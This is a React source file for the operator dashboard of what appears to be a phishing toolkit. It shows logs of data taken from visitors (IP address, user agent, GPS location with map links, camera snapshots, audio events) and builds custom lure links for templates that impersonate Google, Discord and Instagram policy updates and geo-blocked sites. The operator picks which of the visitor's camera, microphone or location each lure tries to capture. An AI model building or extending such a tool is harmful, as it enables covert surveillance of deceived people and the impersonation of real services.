"use client";
import { useEffect, useRef, useState, useMemo } from 'react';
import { useLogs } from '@/contexts/LogContext';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
// PhishingLinkCard is not directly used for the new configurable template section, but its structure is informative.
// import { PhishingLinkCard } from '@/components/dashboard/PhishingLinkCard';
import { MapPin, Camera, Mic, Trash2, ListChecks, AlertTriangle, ExternalLink, Settings2, Globe, Lock, Gamepad2, Copy, Link as LinkIconLucide } from 'lucide-react';
import type { LogEntry, LocationData, CameraData, AudioData } from '@/types';
import { ScrollArea } from '@/components/ui/scroll-area';
import Image from 'next/image';
import { useToast } from '@/hooks/use-toast';
import type { ToastActionElement } from '@/components/ui/toast';
import { ToastAction } from '@/components/ui/toast';
import { cn } from '@/lib/utils';
import { Checkbox } from "@/components/ui/checkbox";
import { Label } from "@/components/ui/label";

// Define data types that can be selected for capture per template
const CAPTURE_OPTIONS = [
    { id: 'location', label: 'Capture Location', Icon: MapPin },
    { id: 'camera', label: 'Capture Camera', Icon: Camera },
    { id: 'audio', label: 'Capture Audio', Icon: Mic },
] as const;
type CaptureOptionType = typeof CAPTURE_OPTIONS[number]['id'];


// Base templates for configuration (derived from allPhishingTemplates)
// We need a flat list of templates, not categorized for this new UI.
const basePhishingTemplatesForConfig = [
  // Location
  { baseId: 'restricted-website-access', name: 'Restricted Website Access', Icon: Globe, description: "Simulates a geo-blocked website." },
  { baseId: 'geo-restricted-service-access', name: 'Geo-Restricted Service Access', Icon: Gamepad2, description: "Simulates accessing a geo-restricted service." },
  { baseId: 'content-unlock', name: 'Content Unlock', Icon: Lock, description: "Simulates unlocking region-restricted content." },
  // Camera
  { baseId: 'google-policy-update', name: 'Google Policy Update', Icon: Globe, description: "Simulates Google policy update with camera capture." },
  { baseId: 'discord-terms-update', name: 'Discord Terms Update', Icon: Globe, description: "Simulates Discord terms update with camera capture." },
  { baseId: 'instagram-privacy-update', name: 'Instagram Privacy Update', Icon: Globe, description: "Simulates Instagram privacy update with camera capture." },
  // Audio
  { baseId: 'voice-assistant', name: 'Voice Assistant Setup', Icon: Mic, description: "Simulates voice assistant setup." },
  { baseId: 'speech-to-text', name: 'Speech-to-Text Demo', Icon: Mic, description: "Simulates speech-to-text service." },
  { baseId: 'quality-check', name: 'Audio Quality Check', Icon: Mic, description: "Simulates microphone quality check." },
];

// Type for the state that holds configurations for each template
type TemplateConfigurations = Record<string, Set<CaptureOptionType>>;

export default function AdvancedDashboardPage() {
  const { logs, clearLogs, isLoading } = useLogs();
  const { toast } = useToast();
  const previousLatestLogIdRef = useRef<string | null>(null);
  const isInitialLoadRef = useRef(true);
  const [expandedImageUrl, setExpandedImageUrl] = useState<string | null>(null);
  const [isModalAnimating, setIsModalAnimating] = useState(false);

  // State for configuring capture types for each base template
  const [templateConfigurations, setTemplateConfigurations] = useState<TemplateConfigurations>({});

  const openModal = (url: string) => {
    setExpandedImageUrl(url);
    requestAnimationFrame(() => setIsModalAnimating(true));
  };

  const closeModal = () => {
    setIsModalAnimating(false);
    setTimeout(() => setExpandedImageUrl(null), 300);
  };

  useEffect(() => {
    if (isLoading) return;
    if (isInitialLoadRef.current) {
      previousLatestLogIdRef.current = logs.length > 0 ? logs[0].id : null;
      isInitialLoadRef.current = false;
      return;
    }
    if (logs.length === 0) {
      previousLatestLogIdRef.current = null;
      return;
    }
    const currentLatestLogId = logs[0].id;
    if (currentLatestLogId !== previousLatestLogIdRef.current) {
      const newLog = logs[0];
      // Removed filter check: if (newLog.type === 'generic' || selectedLogFilters.has(newLog.type as LogFilterDataType))
      let toastTitle = "New Data Captured!";
      let toastDescription = `Type: ${newLog.type}, IP: ${newLog.ip}`;
      let toastAction: ToastActionElement | undefined = undefined;

        if (newLog.type === 'location') {
          const locData = newLog.data as LocationData;
          const city = locData.city || "Unknown City";
          const country = locData.country || "Unknown Country";
          toastTitle = "Location Data Captured!";
          toastDescription = `From ${city}, ${country}. IP: ${newLog.ip}.`;
          if (locData.latitude && locData.longitude) {
            const mapsUrl = `https://www.google.com/maps?q=${locData.latitude},${locData.longitude}`;
            toastAction = <ToastAction altText="Open in Maps" onClick={() => window.open(mapsUrl, '_blank')}><ExternalLink className="mr-2 h-4 w-4" /> Open in Maps</ToastAction>;
          }
        } else if (newLog.type === 'camera') {
          toastTitle = "Camera Snapshot Captured!";
          toastDescription = `Image captured from IP: ${newLog.ip}.`;
        } else if (newLog.type === 'audio') {
          toastTitle = "Audio Capture Simulated!";
          toastDescription = `Audio event from IP: ${newLog.ip}.`;
        } else if (newLog.type === 'generic') {
          toastTitle = "Page Visit Detected!";
          const messageDetail = newLog.data && typeof newLog.data.message === 'string' ? newLog.data.message.split(': ')[1] : 'Unknown page';
          toastDescription = `Page: ${messageDetail || 'N/A'}, IP: ${newLog.ip}`;
        }
        toast({ title: toastTitle, description: toastDescription, variant: "default", action: toastAction });
      // Removed filter check closing brace
      previousLatestLogIdRef.current = currentLatestLogId;
    }
  }, [logs, isLoading, toast]); // removed selectedLogFilters from dependency array

  const formatLogData = (data: any, type: LogEntry['type']): React.ReactNode => {
    if (type === 'camera' && data && typeof data.imageUrl === 'string') {
      const camData = data as CameraData;
      return (
        <div className="mt-2">
          <Image src={camData.imageUrl} alt="Captured image thumbnail" width={160} height={120} className="rounded-md border object-contain cursor-pointer hover:opacity-80 transition-opacity" onClick={() => openModal(camData.imageUrl)} style={{ aspectRatio: '4/3' }} />
          <details className="text-xs mt-1"><summary className="cursor-pointer text-muted-foreground hover:text-foreground">Show Base64 Data (truncated)</summary><pre className="whitespace-pre-wrap break-all text-xs bg-muted/30 p-2 rounded-sm mt-1">{JSON.stringify({ imageUrl: `${camData.imageUrl.substring(0,100)}...` }, null, 2)}</pre></details>
        </div>
      );
    }
    if (type === 'location' && data) return <pre className="whitespace-pre-wrap break-all text-xs">{JSON.stringify(data as LocationData, null, 2)}</pre>;
    if (type === 'audio' && data) return <pre className="whitespace-pre-wrap break-all text-xs">{JSON.stringify(data as AudioData, null, 2)}</pre>;
    return <pre className="whitespace-pre-wrap break-all text-xs">{JSON.stringify(data, null, 2)}</pre>;
  };

  const filteredLogs = useMemo(() => logs, [logs]);

  // For configuring capture types for a specific template
  const handleTemplateCaptureTypeToggle = (templateBaseId: string, captureType: CaptureOptionType) => {
    setTemplateConfigurations(prev => {
      const newConfigs = { ...prev };
      const currentSelection = new Set(newConfigs[templateBaseId] || []);
      currentSelection.has(captureType) ? currentSelection.delete(captureType) : currentSelection.add(captureType);
      newConfigs[templateBaseId] = currentSelection;
      return newConfigs;
    });
  };

  const generateAndCopyLink = (templateBaseId: string, templateName: string) => {
    const selectedCaptureTypes = Array.from(templateConfigurations[templateBaseId] || []);
    let url = `${window.location.origin}/phishing/custom/${templateBaseId}`;
    if (selectedCaptureTypes.length > 0) {
      url += `?capture=${selectedCaptureTypes.join(',')}`;
    }
    navigator.clipboard.writeText(url);
    toast({
      title: "Link Generated & Copied!",
      description: `Custom link for "${templateName}" copied. Types: ${selectedCaptureTypes.join(', ') || 'None'}.`,
    });
  };


  return (
    <>
      <div className="space-y-8">
        <Card className="shadow-lg">
          <CardHeader>
            <CardTitle className="text-2xl flex items-center"><ListChecks className="mr-3 h-7 w-7 text-primary" />Captured Data Logs (Advanced)</CardTitle>
            <CardDescription>View filtered data captured from phishing page interactions. Updates in real-time based on your filter selections.</CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            {isLoading ? <p>Loading logs...</p> : filteredLogs.length === 0 ? (
              <div className="text-center py-8 text-muted-foreground"><AlertTriangle className="mx-auto h-12 w-12 mb-2" /><p className="text-lg">No logs match your current filter.</p><p>Try adjusting filters or interact with phishing templates.</p></div>
            ) : (
              <ScrollArea className="h-[400px] w-full rounded-md border p-4 bg-secondary/30">
                {filteredLogs.map(log => (
                  <div key={log.id} className="mb-4 p-3 rounded-md bg-card shadow-sm border">
                    <p className="font-semibold text-sm text-primary">Log ID: <span className="font-mono text-xs">{log.id}</span></p>
                    <p className="text-xs text-muted-foreground">Timestamp: {new Date(log.timestamp).toLocaleString()}</p>
                    <p className="text-xs text-muted-foreground">Type: <span className="font-medium capitalize">{log.type}</span></p>
                    <p className="text-xs text-muted-foreground">IP: {log.ip}</p>
                    <p className="text-xs text-muted-foreground">User Agent: {log.userAgent}</p>
                    <div className="mt-1 text-sm">Data: {formatLogData(log.data, log.type)}</div>
                  </div>
                ))}
              </ScrollArea>
            )}
            <Button onClick={clearLogs} variant="destructive" disabled={logs.length === 0}><Trash2 className="mr-2 h-4 w-4" /> Delete All Logs</Button>
          </CardContent>
        </Card>

        {/* Removed Log Display Filters Card */}

        <Card className="shadow-lg">
          <CardHeader>
            <CardTitle className="text-2xl flex items-center"><LinkIconLucide className="mr-3 h-7 w-7 text-primary" />Configure & Generate Custom Phishing Links</CardTitle>
            <CardDescription>Select a base template and choose which data types (Location, Camera, Audio) it should attempt to capture. Then generate and copy the custom link.</CardDescription>
          </CardHeader>
          <CardContent className="space-y-6 pt-4">
            {basePhishingTemplatesForConfig.map((template) => {
              const TemplateIcon = template.Icon;
              const selectedCapturesForThisTemplate = templateConfigurations[template.baseId] || new Set();
              return (
                <div key={template.baseId} className="p-4 border rounded-lg bg-background shadow-sm">
                  <div className="flex items-start mb-3">
                    <TemplateIcon className="mr-3 h-7 w-7 text-primary flex-shrink-0 mt-1" />
                    <div>
                        <h3 className="text-lg font-semibold text-foreground">{template.name}</h3>
                        <p className="text-sm text-muted-foreground">{template.description}</p>
                    </div>
                  </div>

                  <div className="my-3 space-y-2 pl-2 border-l-2 ml-2">
                    <p className="text-sm font-medium text-muted-foreground mb-1">Select data to capture with this template:</p>
                    {CAPTURE_OPTIONS.map((option) => {
                      const CaptureIcon = option.Icon;
                      return (
                        <div key={`${template.baseId}-${option.id}`} className="flex items-center space-x-2">
                          <Checkbox
                            id={`${template.baseId}-${option.id}-checkbox`}
                            checked={selectedCapturesForThisTemplate.has(option.id)}
                            onCheckedChange={() => handleTemplateCaptureTypeToggle(template.baseId, option.id)}
                          />
                          <Label
                            htmlFor={`${template.baseId}-${option.id}-checkbox`}
                            className="flex items-center text-sm font-normal cursor-pointer"
                          >
                            <CaptureIcon className="mr-2 h-4 w-4 text-muted-foreground" />
                            {option.label}
                          </Label>
                        </div>
                      );
                    })}
                  </div>
                  <Button
                    onClick={() => generateAndCopyLink(template.baseId, template.name)}
                    variant="default"
                    size="sm"
                    className="mt-3 w-full sm:w-auto"
                  >
                    <Copy className="mr-2 h-4 w-4" /> Generate & Copy Custom Link
                  </Button>
                </div>
              );
            })}
          </CardContent>
        </Card>
      </div>

      {expandedImageUrl && (
        <div className={cn("fixed inset-0 z-[101] flex items-center justify-center p-4 cursor-zoom-out", "transition-opacity duration-300 ease-in-out", isModalAnimating ? "opacity-100 bg-black/80" : "opacity-0 bg-black/0 pointer-events-none")} onClick={closeModal}>
          <div className={cn("transform transition-all duration-300 ease-in-out", isModalAnimating ? "opacity-100 scale-100" : "opacity-0 scale-95")} onClick={(e) => e.stopPropagation()}>
            <Image src={expandedImageUrl!} alt="Expanded captured image" width={0} height={0} sizes="100vw" style={{ width: 'auto', height: 'auto' }} className="max-w-[90vw] max-h-[90vh] object-contain rounded-lg shadow-xl bg-white p-1" />
          </div>
        </div>
      )}
    </>
  );
}
